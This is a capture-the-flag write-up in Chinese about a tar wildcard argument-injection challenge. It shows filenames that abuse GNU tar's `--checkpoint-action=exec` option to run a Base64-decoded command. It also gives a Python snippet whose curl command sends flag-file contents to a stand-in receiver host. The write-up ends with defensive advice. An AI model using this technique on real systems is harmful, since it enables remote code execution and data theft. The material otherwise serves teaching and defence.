# Argument

## 题目简述

文件服务按用户 UUID 保存上传文件，下载时在该目录执行 `tar -cf out.tar *`。文件名过滤了 `..` 和 `/`，但没有阻止以 `--` 开头的名称；shell 展开 `*` 后，这些名称会被 tar 当成命令行选项，形成参数注入。

## 解题过程

GNU tar 的 checkpoint 功能可在归档进度达到指定点时执行程序。至少上传一个普通文件，再上传两个特殊文件名：

```text
--checkpoint=1
--checkpoint-action=exec=echo '<BASE64>' | base64 -d | bash
```

其中 `<BASE64>` 是待执行命令的 Base64，例如把 `/flag*` 内容发送到自己的接收端：

```python
import base64

cmd = b"curl https://receiver.example/$(cat /flag*)"
encoded = base64.b64encode(cmd).decode()
name = f"--checkpoint-action=exec=echo '{encoded}' | base64 -d | bash"
```

Base64 把命令中的 `/` 隐藏在执行时解码的数据中；还应确认所选编码字符串本身未含 `/`，必要时改用不产生该字符的等价命令或分段编码。触发下载后，shell 先把通配符展开为文件名，tar 解析到两项 checkpoint 选项并执行命令。

最终获得：

```text
byuctf{argument_injection_stumped_me_the_most_at_D3FC0N_last_year}
```

## 方法总结

安全文件名不仅要防路径穿越，还要防下游命令把名称解释为选项。调用外部程序时应使用不经 shell 的参数数组、在文件列表前加入 `--`，并避免用通配符重新解析用户控制的名称。
